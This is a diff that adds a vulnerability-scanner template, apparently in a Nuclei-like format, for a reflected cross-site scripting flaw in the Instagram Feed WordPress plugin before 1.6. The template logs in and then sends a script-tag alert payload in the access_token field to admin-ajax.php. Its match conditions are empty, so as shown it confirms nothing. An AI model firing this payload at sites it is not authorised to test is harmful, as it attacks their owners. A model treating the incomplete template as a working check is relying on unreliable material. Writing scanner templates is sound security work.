@@ -1,0 +1,27 @@
+id: wp-instagram-feed-xss
+brief:
+    title: Instagram Feed < 1.6 - Cross-Site Scripting
+    by: theamanrawat
+    level: medium
+    about: The Instagram Feed WordPress plugin before 1.6 contains a reflected cross-site scripting (XSS) vulnerability due to improper sanitization of user-supplied input, allowing attackers to inject malici...
+    label:
+        - wordpress
+        - wp
+        - instagram-feed
+        - xss
+        - authenticated
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-login.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: log={{username}}&pwd={{password}}&wp-submit=Log+In
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-admin/admin-ajax.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: action=sbi_auto_save_tokens&access_token=<script>alert(document.domain)</script>
+      signs: []
